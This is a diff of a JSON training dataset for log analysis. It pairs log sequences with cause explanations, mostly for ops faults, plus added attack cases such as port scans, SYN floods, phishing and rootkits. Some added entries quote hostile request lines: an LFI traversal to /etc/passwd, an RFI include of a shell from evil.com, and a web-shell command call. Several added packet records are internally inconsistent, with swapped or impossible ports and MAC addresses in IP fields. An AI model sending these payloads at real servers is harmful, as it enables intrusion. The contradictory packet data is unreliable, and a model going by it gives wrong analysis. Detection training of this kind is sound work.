         {
-          "timestamp": "2023-03-20T08:30:25.000000",
-          "type": "apache",
-          "log_level": "ERROR",
-          "component": "error",
-          "message": "upstream timed out (110: Connection timed out) while reading response header from upstream",
-          "related_ip": null
+          "timestamp": "2023-03-20T08:30:25",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "cdn-ip",
+          "dst_ip": "origin-server-ip",
+          "src_port": 80,
+          "dst_port": 8080,
+          "message": "HTTP GET /api/v1/data (504 Gateway Timeout)"
         }
       ],
-      "output": "CDN and origin server connectivity issue: Static content served from cache successfully, but API requests failing due to origin server timeout, indicating backend performance problems."
+      "output": "CDN and origin server connectivity issue: Static content was requested via CDN, but an API request resulted in a cache miss and a 504 Gateway Timeout from the origin server, indicating backend performance problems."
     },
     {
       "type": "advanced_analysis",
       "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
       "input": [
         {
-          "timestamp": "2023-03-20T22:45:10.000000",
-          "type": "certificate",
+          "timestamp": "2023-03-20T22:45:10",
+          "type": "syslog",
           "log_level": "WARNING",
           "component": "nginx",
           "message": "SSL certificate for api.company.com expires in 7 days",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T22:45:15.000000",
-          "type": "certificate",
+          "timestamp": "2023-03-20T22:45:15",
+          "type": "syslog",
           "log_level": "ERROR",
           "component": "certbot",
           "message": "Failed to renew certificate: DNS challenge validation failed",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T22:45:20.000000",
-          "type": "monitoring",
-          "log_level": "ALERT",
-          "component": "nagios",
-          "message": "SSL_CERT CRITICAL - Certificate 'api.company.com' expires in 7 days",
-          "related_ip": null
+          "timestamp": "2023-03-20T22:45:20",
+          "type": "network_packet",
+          "protocol": "DNS",
+          "src_ip": "certbot-ip",
+          "dst_ip": "dns-server-ip",
+          "src_port": 53,
+          "dst_port": 53,
+          "message": "DNS query for _acme-challenge.api.company.com"
         }
       ],
-      "output": "SSL certificate renewal failure: Automatic certificate renewal failed due to DNS validation issues, with certificate expiring in 7 days, triggering monitoring alerts for manual intervention."
+      "output": "SSL certificate renewal failure: Certbot failed to renew the certificate due to DNS validation issues, as indicated by syslog entries and a DNS query for the ACME challenge record."
     },
     {
       "type": "advanced_analysis",
       "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
       "input": [
         {
-          "timestamp": "2023-03-20T17:20:30.000000",
-          "type": "storage",
+          "timestamp": "2023-03-20T17:20:30",
+          "type": "syslog",
           "log_level": "WARNING",
           "component": "nfs",
-          "message": "RPC: remote server not responding, still trying to connect to 10.0.2.100",
+          "message": "RPC: remote server not responding",
           "related_ip": "10.0.2.100"
         },
         {
-          "timestamp": "2023-03-20T17:20:45.000000",
-          "type": "application",
+          "timestamp": "2023-03-20T17:20:45",
+          "type": "syslog",
           "log_level": "ERROR",
           "component": "file_processor",
-          "message": "Failed to read file /shared/uploads/batch_001.csv: Input/output error",
+          "message": "Failed to read file: Input/output error",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T17:20:50.000000",
-          "type": "monitoring",
-          "log_level": "CRITICAL",
-          "component": "disk_monitor",
-          "message": "Shared storage /shared/ mounted with errors, file operations failing",
-          "related_ip": null
+          "timestamp": "2023-03-20T17:20:50",
+          "type": "network_packet",
+          "protocol": "NFS",
+          "src_ip": "10.0.2.1",
+          "dst_ip": "10.0.2.100",
+          "src_port": 2049,
+          "dst_port": 2049,
+          "message": "NFS READ request (no response)"
         }
       ],
-      "output": "Network storage failure: NFS server 10.0.2.100 became unresponsive, causing I/O errors in file processing applications and triggering storage monitoring alerts."
+      "output": "Network storage failure: NFS server 10.0.2.100 became unresponsive, causing I/O errors in file processing applications, and an unresponsive NFS READ request packet, indicating a critical storage issue."
     },
     {
       "type": "advanced_analysis",
       "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
       "input": [
         {
-          "timestamp": "2023-03-20T12:15:00.000000",
-          "type": "queue",
-          "log_level": "WARNING",
-          "component": "rabbitmq",
-          "message": "Queue 'task_queue' has 50000 messages, exceeding threshold",
-          "related_ip": null
-        },
-        {
-          "timestamp": "2023-03-20T12:15:10.000000",
-          "type": "application",
-          "log_level": "ERROR",
-          "component": "worker_service",
-          "message": "Worker process crashed: Out of memory processing large dataset",
-          "related_ip": null
-        },
-        {
-          "timestamp": "2023-03-20T12:15:15.000000",
-          "type": "monitoring",
-          "log_level": "ALERT",
-          "component": "queue_monitor",
-          "message": "Message queue backlog detected: processing capacity insufficient",
-          "related_ip": null
-        }
-      ],
-      "output": "Message queue bottleneck: Worker service crashed due to memory issues, causing message backlog of 50,000 items in queue, indicating insufficient processing capacity or resource constraints."
-    },
-    {
-      "type": "advanced_analysis",
-      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
-      "input": [
-        {
-          "timestamp": "2023-03-20T15:40:20.000000",
-          "type": "backup",
-          "log_level": "INFO",
-          "component": "backup_script",
-          "message": "Starting incremental backup: 847 files to process",
-          "related_ip": null
-        },
-        {
-          "timestamp": "2023-03-20T15:45:30.000000",
-          "type": "backup",
-          "log_level": "ERROR",
-          "component": "rsync",
-          "message": "rsync error: partial transfer due to vanished source files (code 24)",
-          "related_ip": null
-        },
-        {
-          "timestamp": "2023-03-20T15:45:35.000000",
+          "timestamp": "2023-03-20T12:15:00",
           "type": "syslog",
           "log_level": "WARNING",
-          "component": "kernel",
-          "message": "journal: 10 sequencer events lost",
+          "component": "rabbitmq",
+          "message": "Queue 'task_queue' has 50000 messages",
           "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T12:15:10",
+          "type": "syslog",
+          "log_level": "ERROR",
+          "component": "worker_service",
+          "message": "Worker process crashed: Out of memory",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T12:15:15",
+          "type": "network_packet",
+          "protocol": "AMQP",
+          "src_ip": "worker-ip",
+          "dst_ip": "rabbitmq-ip",
+          "src_port": 5672,
+          "dst_port": 5672,
+          "message": "AMQP connection close (unexpected)"
         }
       ],
-      "output": "Backup integrity issue: Incremental backup encountered partial transfer errors due to files being modified or deleted during backup process, potentially indicating high system activity or file system issues."
+      "output": "Message queue bottleneck: Worker service crashed due to memory issues, causing a large message backlog in RabbitMQ and an unexpected AMQP connection close, indicating insufficient processing capacity."
     },
     {
       "type": "advanced_analysis",
       "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
       "input": [
         {
-          "timestamp": "2023-03-20T21:30:10.000000",
-          "type": "api_gateway",
-          "log_level": "WARNING",
-          "component": "kong",
-          "message": "Rate limit exceeded for API key 'abc123': 1000 requests in 60 seconds",
+          "timestamp": "2023-03-20T15:40:20",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "backup_script",
+          "message": "Starting incremental backup",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T21:30:15.000000",
-          "type": "api_gateway",
-          "log_level": "INFO",
-          "component": "kong",
-          "message": "HTTP 429 Too Many Requests returned to client 192.168.1.150",
-          "related_ip": "192.168.1.150"
+          "timestamp": "2023-03-20T15:45:30",
+          "type": "syslog",
+          "log_level": "ERROR",
+          "component": "rsync",
+          "message": "rsync error: partial transfer",
+          "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T21:30:20.000000",
-          "type": "application",
+          "timestamp": "2023-03-20T15:45:35",
+          "type": "network_packet",
+          "protocol": "SSH",
+          "src_ip": "backup-server-ip",
+          "dst_ip": "target-server-ip",
+          "src_port": 22,
+          "dst_port": 22,
+          "message": "SSH connection terminated unexpectedly"
+        }
+      ],
+      "output": "Backup integrity issue: Incremental backup failed with a partial transfer error, followed by an unexpected SSH connection termination, suggesting network instability or issues on the target server during backup."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T21:30:10",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "kong",
+          "message": "Rate limit exceeded for API key 'abc123'",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T21:30:15",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.1.150",
+          "dst_ip": "api-gateway-ip",
+          "src_port": 54329,
+          "dst_port": 80,
+          "message": "HTTP 429 Too Many Requests"
+        },
+        {
+          "timestamp": "2023-03-20T21:30:20",
+          "type": "syslog",
           "log_level": "ERROR",
           "component": "mobile_app",
-          "message": "API call failed: Rate limit exceeded, implementing exponential backoff",
+          "message": "API call failed: Rate limit exceeded",
           "related_ip": null
         }
       ],
-      "output": "API rate limiting triggered: Client exceeded 1000 requests per minute threshold, API gateway returned 429 status, mobile application implementing backoff strategy to handle rate limiting."
+      "output": "API rate limiting triggered: An API key exceeded its rate limit, resulting in HTTP 429 responses and mobile application errors, indicating excessive API usage."
     },
     {
       "type": "advanced_analysis",
       "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
       "input": [
         {
-          "timestamp": "2023-03-20T18:45:30.000000",
-          "type": "search",
+          "timestamp": "2023-03-20T18:45:30",
+          "type": "syslog",
           "log_level": "WARNING",
           "component": "elasticsearch",
-          "message": "Cluster health status changed from GREEN to YELLOW: 2 unassigned shards",
+          "message": "Cluster health status changed to YELLOW",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T18:45:35.000000",
-          "type": "search",
+          "timestamp": "2023-03-20T18:45:35",
+          "type": "syslog",
           "log_level": "ERROR",
           "component": "elasticsearch",
-          "message": "Node [node-3] left the cluster, reason: [failed to ping master within timeout]",
+          "message": "Node [node-3] left the cluster",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T18:45:40.000000",
-          "type": "application",
-          "log_level": "WARNING",
-          "component": "search_service",
-          "message": "Search performance degraded: average query time increased to 2.5s",
-          "related_ip": null
+          "timestamp": "2023-03-20T18:45:40",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "node-3-ip",
+          "dst_ip": "master-node-ip",
+          "src_port": 9300,
+          "dst_port": 9300,
+          "flags": "RST",
+          "length": 40,
+          "message": "TCP RST packet from node-3 to master-node:9300"
         }
       ],
-      "output": "Elasticsearch cluster degradation: Node failure caused cluster health to deteriorate from GREEN to YELLOW with unassigned shards, resulting in degraded search performance and increased query response times."
+      "output": "Elasticsearch cluster degradation: A node left the cluster, causing the cluster health to turn yellow, and a TCP RST packet from the leaving node, indicating a node failure."
     },
     {
       "type": "advanced_analysis",
       "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
       "input": [
         {
-          "timestamp": "2023-03-20T10:20:15.000000",
-          "type": "cache",
+          "timestamp": "2023-03-20T10:20:15",
+          "type": "syslog",
           "log_level": "WARNING",
           "component": "redis",
-          "message": "Memory usage: 2.8GB used of 4GB limit (70%)",
+          "message": "Memory usage: 70%",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T10:20:30.000000",
-          "type": "cache",
+          "timestamp": "2023-03-20T10:20:30",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "redis",
-          "message": "Evicted 1000 keys using allkeys-lru policy",
+          "message": "Evicted 1000 keys",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T10:20:35.000000",
-          "type": "application",
-          "log_level": "INFO",
-          "component": "web_app",
-          "message": "Cache miss rate increased to 25%, database query load elevated",
-          "related_ip": null
+          "timestamp": "2023-03-20T10:20:35",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "app-server-ip",
+          "dst_ip": "redis-server-ip",
+          "src_port": 54330,
+          "dst_port": 6379,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from app-server to redis-server:6379"
         }
       ],
-      "output": "Cache memory pressure: Redis approaching memory limit triggered LRU eviction of 1000 keys, resulting in increased cache miss rate and elevated database query load as application requests fallback to primary storage."
+      "output": "Cache memory pressure: Redis approached its memory limit and evicted keys, followed by a new TCP SYN packet from an application server to Redis, suggesting increased cache demand or a cache miss scenario."
     },
     {
       "type": "advanced_analysis",
       "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
       "input": [
         {
-          "timestamp": "2023-03-20T07:30:00.000000",
-          "type": "monitoring",
+          "timestamp": "2023-03-20T07:30:00",
+          "type": "syslog",
           "log_level": "WARNING",
           "component": "prometheus",
-          "message": "Target down: api-server (http://10.0.1.50:8080/metrics) - connection refused",
+          "message": "Target down: api-server",
           "related_ip": "10.0.1.50"
         },
         {
-          "timestamp": "2023-03-20T07:30:15.000000",
-          "type": "monitoring",
+          "timestamp": "2023-03-20T07:30:15",
+          "type": "syslog",
           "log_level": "ALERT",
           "component": "alertmanager",
-          "message": "Firing alert: APIServerDown - API server has been down for 5 minutes",
+          "message": "Firing alert: APIServerDown",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T07:30:20.000000",
-          "type": "notification",
-          "log_level": "INFO",
-          "component": "slack_webhook",
-          "message": "Alert sent to #ops-alerts: API server outage detected",
-          "related_ip": null
+          "timestamp": "2023-03-20T07:30:20",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "alertmanager-ip",
+          "dst_ip": "slack-webhook-ip",
+          "src_port": 80,
+          "dst_port": 443,
+          "message": "HTTP POST to Slack webhook"
         }
       ],
-      "output": "Service monitoring and alerting workflow: API server at 10.0.1.50 became unreachable, Prometheus detected the outage, Alertmanager fired alert after 5-minute threshold, and notification sent to operations team via Slack."
+      "output": "Service monitoring and alerting workflow: API server became unreachable, Prometheus detected the outage, Alertmanager fired an alert, and a notification was sent via a Slack webhook, indicating a complete alert pipeline."
     },
     {
       "type": "advanced_analysis",
       "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
       "input": [
         {
-          "timestamp": "2023-03-20T20:15:10.000000",
-          "type": "cdn",
+          "timestamp": "2023-03-20T20:15:10",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "cloudflare",
-          "message": "Origin shield cache purged for domain api.company.com",
+          "message": "Cache purged for api.company.com",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T20:15:15.000000",
-          "type": "apache",
-          "log_level": "WARNING",
-          "component": "access",
-          "message": "Sudden spike in traffic: 500% increase in requests to /api/v1/products",
-          "related_ip": null
+          "timestamp": "2023-03-20T20:15:15",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "client-ip",
+          "dst_ip": "origin-server-ip",
+          "src_port": 54331,
+          "dst_port": 80,
+          "message": "HTTP GET /api/v1/products"
         },
         {
-          "timestamp": "2023-03-20T20:15:20.000000",
-          "type": "database",
+          "timestamp": "2023-03-20T20:15:20",
+          "type": "syslog",
           "log_level": "WARNING",
           "component": "mysql",
-          "message": "Max connections reached: 151 connections active",
+          "message": "Max connections reached",
           "related_ip": null
         }
       ],
-      "output": "CDN cache invalidation impact: Cache purge caused direct traffic spike to origin server, overwhelming database connection pool as all requests bypassed CDN cache, highlighting dependency on caching for performance."
+      "output": "CDN cache invalidation impact: Cache purge caused direct traffic spike to the origin server, leading to increased HTTP requests and the database reaching its maximum connections, highlighting the dependency on caching for performance."
     },
     {
       "type": "advanced_analysis",
       "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
       "input": [
         {
-          "timestamp": "2023-03-20T05:00:00.000000",
-          "type": "backup",
+          "timestamp": "2023-03-20T05:00:00",
+          "type": "syslog",
           "log_level": "INFO",
           "component": "cron",
-          "message": "Weekly full backup job started for database 'production'",
+          "message": "Weekly full backup job started",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T05:15:30.000000",
-          "type": "database",
+          "timestamp": "2023-03-20T05:15:30",
+          "type": "syslog",
           "log_level": "WARNING",
           "component": "mysql",
-          "message": "Long-running transaction detected: backup process holding shared locks",
+          "message": "Long-running transaction detected",
           "related_ip": null
         },
         {
-          "timestamp": "2023-03-20T05:16:00.000000",
-          "type": "application",
-          "log_level": "ERROR",
-          "component": "web_app",
-          "message": "Database write operations timing out: Lock wait timeout exceeded",
+          "timestamp": "2023-03-20T05:16:00",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "app-server-ip",
+          "dst_ip": "db-server-ip",
+          "src_port": 3306,
+          "dst_port": 54332,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from app-server to db-server:3306 (no response)"
+        }
+      ],
+      "output": "Backup operation database impact: A long-running backup transaction caused database contention, leading to application connection issues (TCP SYN with no response), indicating a performance bottleneck during backups."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T14:30:10",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "apache",
+          "message": "GET /wp-admin/admin-ajax.php",
+          "related_ip": "192.168.1.75"
+        },
+        {
+          "timestamp": "2023-03-20T14:30:12",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.1.75",
+          "dst_ip": "web-server-ip",
+          "src_port": 54333,
+          "dst_port": 80,
+          "message": "HTTP POST /wp-admin/admin-post.php"
+        },
+        {
+          "timestamp": "2023-03-20T14:30:15",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "mysql",
+          "message": "Query: INSERT INTO wp_posts",
           "related_ip": null
         }
       ],
-      "output": "Backup operation database impact: Weekly full backup process created long-running transaction with shared locks, causing write operation timeouts in production application due to lock contention."
+      "output": "WordPress content management activity: User from 192.168.1.75 interacted with the WordPress admin interface via HTTP requests, leading to a database insertion, indicating a content update."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T16:20:00",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "192.168.203.243",
+          "dst_ip": "192.168.133.140",
+          "src_port": 10000,
+          "dst_port": 80,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from 192.168.203.243 to 192.168.133.140:80"
+        },
+        {
+          "timestamp": "2023-03-20T16:20:01",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "192.168.203.243",
+          "dst_ip": "192.168.133.140",
+          "src_port": 10001,
+          "dst_port": 443,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet from 192.168.203.243 to 192.168.133.140:443"
+        },
+        {
+          "timestamp": "2023-03-20T16:20:05",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "ids",
+          "message": "Port scan detected from 192.168.203.243",
+          "related_ip": "192.168.203.243"
+        }
+      ],
+      "output": "Port scanning activity detected: Multiple TCP SYN packets to different ports from a single attacker IP, followed by an IDS alert, confirming a port scan."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T11:30:45",
+          "type": "network_packet",
+          "protocol": "ICMP",
+          "src_ip": "source-ip",
+          "dst_ip": "destination-ip",
+          "message": "ICMP echo request (large packet)"
+        },
+        {
+          "timestamp": "2023-03-20T11:30:50",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "kernel",
+          "message": "Large ICMP packet received, potential DoS",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T11:30:55",
+          "type": "network_packet",
+          "protocol": "ICMP",
+          "src_ip": "source-ip",
+          "dst_ip": "destination-ip",
+          "message": "ICMP echo request (fragmented)"
+        }
+      ],
+      "output": "Potential Ping of Death attack: Large and fragmented ICMP echo requests were observed, and the kernel logged a warning about a potential DoS attack, indicating an attempt to exploit ICMP vulnerabilities."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T19:15:10",
+          "type": "network_packet",
+          "protocol": "DNS",
+          "src_ip": "client-ip",
+          "dst_ip": "dns-server-ip",
+          "message": "DNS query for suspicious.domain.com"
+        },
+        {
+          "timestamp": "2023-03-20T19:15:20",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "dns_monitor",
+          "message": "Suspicious DNS query detected: suspicious.domain.com",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T19:15:25",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "client-ip",
+          "dst_ip": "suspicious.domain.com-ip",
+          "src_port": 12345,
+          "dst_port": 443,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet to suspicious.domain.com:443"
+        }
+      ],
+      "output": "Potential C2 communication: A suspicious DNS query was detected and alerted, followed by a TCP SYN packet to the resolved IP of the suspicious domain, indicating a possible command and control communication attempt."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T13:00:00",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.203.243",
+          "dst_ip": "web-server-ip",
+          "src_port": 12346,
+          "dst_port": 80,
+          "message": "HTTP GET /upload.php?file=../../../../etc/passwd%00.jpg"
+        },
+        {
+          "timestamp": "2023-03-20T13:00:15",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "apache",
+          "message": "Access to /etc/passwd attempted by 192.168.203.243",
+          "related_ip": "192.168.203.243"
+        },
+        {
+          "timestamp": "2023-03-20T13:00:30",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.203.243",
+          "dst_ip": "web-server-ip",
+          "src_port": 12347,
+          "dst_port": 80,
+          "message": "HTTP GET /include.php?path=http://evil.com/shell.txt"
+        }
+      ],
+      "output": "Local File Inclusion (LFI) and Remote File Inclusion (RFI) attempts: An attacker attempted to access sensitive files via LFI, followed by an RFI attempt to include a remote shell, indicating a persistent attack."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T21:45:30",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "198.51.100.200",
+          "dst_ip": "10.0.0.10",
+          "src_port": 10000,
+          "dst_port": 80,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet (high rate)"
+        },
+        {
+          "timestamp": "2023-03-20T21:45:32",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "firewall",
+          "message": "SYN flood detected from 198.51.100.200",
+          "related_ip": "198.51.100.200"
+        },
+        {
+          "timestamp": "2023-03-20T21:45:35",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "198.51.100.200",
+          "dst_ip": "10.0.0.10",
+          "src_port": 10001,
+          "dst_port": 80,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet (high rate)"
+        }
+      ],
+      "output": "SYN Flood DDoS Attack: A high rate of TCP SYN packets from a single source IP was detected and logged by the firewall as a SYN flood, indicating a denial-of-service attack."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T13:15:20",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "kernel",
+          "message": "usb 1-2: new high-speed USB device",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T13:15:25",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "udev",
+          "message": "Unknown USB device detected",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T13:15:30",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "usb_guard",
+          "message": "Potential USB attack device blocked",
+          "related_ip": null
+        }
+      ],
+      "output": "USB-based Attack (Rubber Ducky): A new, unknown USB device was detected and subsequently blocked by a security component, indicating a potential malicious USB device attempt."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T18:30:10",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "postfix",
+          "message": "from=<attacker@phishing-site.com>",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T18:30:15",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.1.50",
+          "dst_ip": "phishing-site-ip",
+          "src_port": 54334,
+          "dst_port": 80,
+          "message": "HTTP GET /fake-login.html"
+        },
+        {
+          "timestamp": "2023-03-20T18:30:20",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "192.168.1.50",
+          "dst_ip": "phishing-site-ip",
+          "src_port": 54335,
+          "dst_port": 80,
+          "message": "HTTP POST /steal-credentials.php"
+        }
+      ],
+      "output": "Phishing Attack: An email from a suspicious sender was received, followed by a user accessing a fake login page and submitting credentials to a phishing site, indicating a successful phishing attempt."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T20:15:45",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "kernel",
+          "message": "segfault at 41414141",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T20:15:46",
+          "type": "syslog",
+          "log_level": "ERROR",
+          "component": "vulnerable_app",
+          "message": "Buffer overflow detected",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T20:15:47",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "192.168.203.243",
+          "dst_ip": "vulnerable-app-ip",
+          "src_port": 12348,
+          "dst_port": 8080,
+          "flags": "PSH,ACK",
+          "length": 500,
+          "message": "TCP PSH,ACK packet (exploit payload)"
+        }
+      ],
+      "output": "Buffer Overflow Exploit: A kernel segmentation fault and a buffer overflow detection in a vulnerable application, combined with a network packet containing an exploit payload, indicate a successful buffer overflow attack."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T07:45:20",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "203.0.113.99",
+          "dst_ip": "web-server-ip",
+          "src_port": 12349,
+          "dst_port": 80,
+          "message": "HTTP POST /upload/shell.php"
+        },
+        {
+          "timestamp": "2023-03-20T07:45:25",
+          "type": "network_packet",
+          "protocol": "HTTP",
+          "src_ip": "203.0.113.99",
+          "dst_ip": "web-server-ip",
+          "src_port": 12350,
+          "dst_port": 80,
+          "message": "HTTP GET /upload/shell.php?cmd=whoami"
+        },
+        {
+          "timestamp": "2023-03-20T07:45:30",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "security",
+          "message": "Web shell detected",
+          "related_ip": null
+        }
+      ],
+      "output": "Web Shell Upload Attack: An HTTP POST request to upload a shell, followed by an HTTP GET request to execute a command on the uploaded shell, and a security alert, confirm a web shell upload attack."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T17:20:30",
+          "type": "syslog",
+          "log_level": "INFO",
+          "component": "hostapd",
+          "message": "STA aa:bb:cc:dd:ee:ff authenticated",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T17:20:35",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "hostapd",
+          "message": "AP-STA-POSSIBLE-PSK-MISMATCH aa:bb:cc:dd:ee:ff",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T17:20:40",
+          "type": "network_packet",
+          "protocol": "802.11",
+          "src_ip": "rogue-ap-mac",
+          "dst_ip": "client-mac",
+          "message": "802.11 Deauthentication frame"
+        }
+      ],
+      "output": "Evil Twin WiFi Attack: A client authenticated to a legitimate AP, but then a PSK mismatch warning and a deauthentication frame from a rogue AP were observed, indicating an Evil Twin attack."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T22:30:15",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "aide",
+          "message": "File integrity violation: /bin/ls modified",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T22:30:20",
+          "type": "syslog",
+          "log_level": "WARNING",
+          "component": "aide",
+          "message": "File integrity violation: /usr/bin/ps modified",
+          "related_ip": null
+        },
+        {
+          "timestamp": "2023-03-20T22:30:25",
+          "type": "syslog",
+          "log_level": "CRITICAL",
+          "component": "security",
+          "message": "Rootkit detected",
+          "related_ip": null
+        }
+      ],
+      "output": "Rootkit Installation: Multiple critical system binaries were detected with integrity violations, followed by a security alert for rootkit detection, indicating a successful rootkit installation."
+    },
+    {
+      "type": "advanced_analysis",
+      "instruction": "Analyze the following log sequence and infer the underlying cause or pattern of activities.",
+      "input": [
+        {
+          "timestamp": "2023-03-20T06:15:45",
+          "type": "network_packet",
+          "protocol": "TCP",
+          "src_ip": "203.0.113.77",
+          "dst_ip": "10.0.0.10",
+          "src_port": 10000,
+          "dst_port": 21,
+          "flags": "SYN",
+          "length": 60,
+          "message": "TCP SYN packet to 10.0.0.10:21"
+        },
+        {
+          "timestamp": "2023-03-20T06:16:00",
+          "type": "network_packet",
+          "protocol": "UDP",
+          "src_ip": "203.0.113.77",
+          "dst_ip": "10.0.0.10",
+          "src_port": 10001,
+          "dst_port": 53,
+          "message": "UDP packet to 10.0.0.10:53"
+        },
+        {
+          "timestamp": "2023-03-20T06:16:15",
+          "type": "syslog",
+          "log_level": "ALERT",
+          "component": "snort",
+          "message": "Comprehensive port scan detected from 203.0.113.77",
+          "related_ip": "203.0.113.77"
+        }
+      ],
